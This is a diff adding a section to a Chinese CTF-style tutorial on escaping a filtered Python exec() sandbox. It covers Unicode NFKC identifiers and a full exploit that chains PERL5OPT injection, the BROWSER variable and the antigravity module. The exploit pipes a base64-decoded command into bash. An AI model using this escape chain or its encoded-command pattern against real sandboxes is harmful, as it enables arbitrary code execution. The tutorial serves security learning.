@@ -170,3 +170,232 @@ for c in 'h@"\'(':
 
 exec(data)
 ```
+
+### 更进一步
+实际上python是支持Non-ASCII Identifies也就是说可以使用unicode字符的，具体参考见: https://peps.python.org/pep-3131/ ，这里需要注意的是这一点:
+> The following changes will need to be made to the parser:
+> 1.  If a non-ASCII character is found in the UTF-8 representation of the source code, a forward scan is made to find the first ASCII non-identifier character (e.g. a space or punctuation character)
+> 2.  The entire UTF-8 string is passed to a function to normalize the string to NFKC, and then verify that it follows the identifier syntax. No such callout is made for pure-ASCII identifiers, which continue to be parsed the way they are today. The Unicode database must start including the Other_ID_{Start|Continue} property.
+> 3.  If this specification is implemented for 2.x, reflective libraries (such as pydoc) must be verified to continue to work when Unicode strings appear in `__dict__` slots as keys.
+
+稍微翻译一下也就是说如果我们使用了UTF-8中的非ASCII码作为标识符，那么其会被函数转换为NFKC标准格式，也就是说我们可以使用例如`ʰ`来代替`h`，从而绕过限制。
+
+但是假如我们的题目会将用户输入先转换为NFKC标准格式再进行判断，并且将`_`这个字符也过滤，，我们还有办法实现任意代码执行吗？
+
+```python
+from unicodedata import normalize
+data  = input()
+data = normalize("NFKC", data)
+
+for c in 'h@"\'(_':
+    if c in data:
+        print(c)
+        exit(0)
+
+exec(data)
+```
+
+很明显，我们没办法再覆盖一些魔术方法(因为方法名包含_)，但是实际上我们还是能通过一些操作来进行rce的，这个rce方式就是环境变量注入,具体文章可参考[## HACKING WITH ENVIRONMENT VARIABLES](https://www.elttam.com/blog/env/)
+
+我们这里先贴出最终的exp，然后再分析其原理:
+```python
+from string import printable
+from base64 import b64decode
+from unicodedata import normalize
+
+def translate(s):
+    r = ""
+    for c in s:
+        r += f"x[{printable.find(c)}]+"
+
+    return r.rstrip("+")
+
+
+code = f"""
+from os import environ
+from string import printable as x
+environ[{translate("PERL5OPT")}] = {translate("-Mbase;system('echo$IFS$9bHM=|base64$IFS$9-d|bash');exit;")}
+environ[{translate("BROWSER")}] = {translate("perlthanks")}
+import antigravity
+""" # exp
+
+normalize("NFKC", code)
+
+for c in 'h"\'(@_':
+    if c in code:
+        print("no!!!!")
+        exit(0)
+
+exec(code)
+```
+
+这个exp实际上利用到了perl的环境变量注入，这里不对perl做过多的深入研究，大概原理是在perl运行时会使用到`PERL5OPT`这个环境变量，这个环境变量可以指定`-M`选项导入模块，同时在这之后可以注入一段perl代码，利用这个最终实现任意代码执行。
+
+我们重点关注BROWSER环境变量和`antigravity`这个模块。`antigravity`这个模块实际上是在python添加的一个圣诞节彩蛋，我们可以在[这里](https://hg.python.org/cpython/file/tip/Lib/antigravity.py)看到它的源码:
+![](https://gitee.com/guuest/images/raw/master/img/20220321172430.png)
+
+这里唯一值得注意的是其在被导入时会调用`webbrowser.open()`方法打开一个网站，我们在cpython中看看其[代码](https://github.com/python/cpython/blob/main/Lib/webbrowser.py)的实现，重点关注以下几个函数:
+
+open函数会在没有browser时先注册，然后调用`browser.open()`去打开对应的网址:
+```python
+def open(url, new=0, autoraise=True):
+    """Display url using the default browser.
+    If possible, open url in a location determined by new.
+    - 0: the same browser window (the default).
+    - 1: a new browser window.
+    - 2: a new browser page ("tab").
+    If possible, autoraise raises the window (the default) or not.
+    """
+    if _tryorder is None:
+        with _lock:
+            if _tryorder is None:
+                register_standard_browsers()
+    for name in _tryorder:
+        browser = get(name)
+        if browser.open(url, new, autoraise):
+            return True
+    return False
+```
+
+register_standard_browsers函数会调用register函数注册浏览器，实际上就是将浏览器名字与对应的类绑定在了一起，我们注意到这里使用到了一个环境变量`BROWSER`，可以允许使用者覆盖自己的浏览器，如果设置了这个环境变量，其最终会注册一个GenericBrowser类:
+```python
+def register_standard_browsers():
+    global _tryorder
+    _tryorder = []
+
+    if sys.platform == 'darwin':
+        register("MacOSX", None, MacOSXOSAScript('default'))
+        register("chrome", None, MacOSXOSAScript('chrome'))
+        register("firefox", None, MacOSXOSAScript('firefox'))
+        register("safari", None, MacOSXOSAScript('safari'))
+        # OS X can use below Unix support (but we prefer using the OS X
+        # specific stuff)
+
+    if sys.platform == "serenityos":
+        # SerenityOS webbrowser, simply called "Browser".
+        register("Browser", None, BackgroundBrowser("Browser"))
+
+    if sys.platform[:3] == "win":
+        # First try to use the default Windows browser
+        register("windows-default", WindowsDefault)
+
+        # Detect some common Windows browsers, fallback to IE
+        iexplore = os.path.join(os.environ.get("PROGRAMFILES", "C:\\Program Files"),
+                                "Internet Explorer\\IEXPLORE.EXE")
+        for browser in ("firefox", "firebird", "seamonkey", "mozilla",
+                        "netscape", "opera", iexplore):
+            if shutil.which(browser):
+                register(browser, None, BackgroundBrowser(browser))
+    else:
+        # Prefer X browsers if present
+        if os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY"):
+            try:
+                cmd = "xdg-settings get default-web-browser".split()
+                raw_result = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
+                result = raw_result.decode().strip()
+            except (FileNotFoundError, subprocess.CalledProcessError, PermissionError, NotADirectoryError) :
+                pass
+            else:
+                global _os_preferred_browser
+                _os_preferred_browser = result
+
+            register_X_browsers()
+
+        # Also try console browsers
+        if os.environ.get("TERM"):
+            if shutil.which("www-browser"):
+                register("www-browser", None, GenericBrowser("www-browser"))
+            # The Links/elinks browsers <http://artax.karlin.mff.cuni.cz/~mikulas/links/>
+            if shutil.which("links"):
+                register("links", None, GenericBrowser("links"))
+            if shutil.which("elinks"):
+                register("elinks", None, Elinks("elinks"))
+            # The Lynx browser <http://lynx.isc.org/>, <http://lynx.browser.org/>
+            if shutil.which("lynx"):
+                register("lynx", None, GenericBrowser("lynx"))
+            # The w3m browser <http://w3m.sourceforge.net/>
+            if shutil.which("w3m"):
+                register("w3m", None, GenericBrowser("w3m"))
+
+    # OK, now that we know what the default preference orders for each
+    # platform are, allow user to override them with the BROWSER variable.
+    if "BROWSER" in os.environ:
+        userchoices = os.environ["BROWSER"].split(os.pathsep)
+        userchoices.reverse()
+
+        # Treat choices in same way as if passed into get() but do register
+        # and prepend to _tryorder
+        for cmdline in userchoices:
+            if cmdline != '':
+                cmd = _synthesize(cmdline, preferred=True)
+                if cmd[1] is None:
+                    register(cmdline, None, GenericBrowser(cmdline), preferred=True)
+```
+
+`GenericBrowser.open()`函数是我们最终的目的，其实际上调用了`subprocess.open()`函数来实现使用浏览器打开的目的:
+```python
+class GenericBrowser(BaseBrowser):
+    """Class for all browsers started with a command
+       and without remote functionality."""
+
+    def __init__(self, name):
+        if isinstance(name, str):
+            self.name = name
+            self.args = ["%s"]
+        else:
+            # name should be a list with arguments
+            self.name = name[0]
+            self.args = name[1:]
+        self.basename = os.path.basename(self.name)
+
+    def open(self, url, new=0, autoraise=True):
+        sys.audit("webbrowser.open", url)
+        cmdline = [self.name] + [arg.replace("%s", url)
+                                 for arg in self.args]
+        try:
+            if sys.platform[:3] == 'win':
+                p = subprocess.Popen(cmdline)
+            else:
+                p = subprocess.Popen(cmdline, close_fds=True)
+            return not p.wait()
+        except OSError:
+            return False
+```
+
+综上所述，如果我们控制了`BROWSER`这个环境变量，就可以控制命令执行调用的命令，最终执行类似于`BROWSER https://xkcd.com/353/`这样的命令，我们是没办法控制命令的参数的。这里就需要利用到其他命令的环境变量注入了。
+
+在一般的linux发行版中，一般自带了perl这个编程语言以及默认的perl脚本，例如perldoc和perlthanks，这里exp最终使用的是perlthanks/perldoc而非使用perl的原因是如果执行`perl https://xkcd.com/353/`，那么perl会报错返回，不会处理`PERL5OPT`这个环境变量，而`perldoc`与`perlthanks`这2个脚本则再处理了`PERL5OPT`之后返回，这给了我们最终exp的机会。
+
+最终我们来回顾一下exp，除了上面提到的点之外，我们还使用了`string.printable`这串字符串来构造任意字符，其包含了所有可见的ascii字符。
+```python
+from string import printable
+from base64 import b64decode
+from unicodedata import normalize
+
+def translate(s):
+    r = ""
+    for c in s:
+        r += f"x[{printable.find(c)}]+"
+
+    return r.rstrip("+")
+
+
+code = f"""
+from os import environ
+from string import printable as x
+environ[{translate("PERL5OPT")}] = {translate("-Mbase;system('echo$IFS$9bHM=|base64$IFS$9-d|bash');exit;")}
+environ[{translate("BROWSER")}] = {translate("perlthanks")}
+import antigravity
+""" # exp
+
+normalize("NFKC", code)
+
+for c in 'h"\'(@_':
+    if c in code:
+        print("no!!!!")
+        exit(0)
+
+exec(code)
+```
+
+
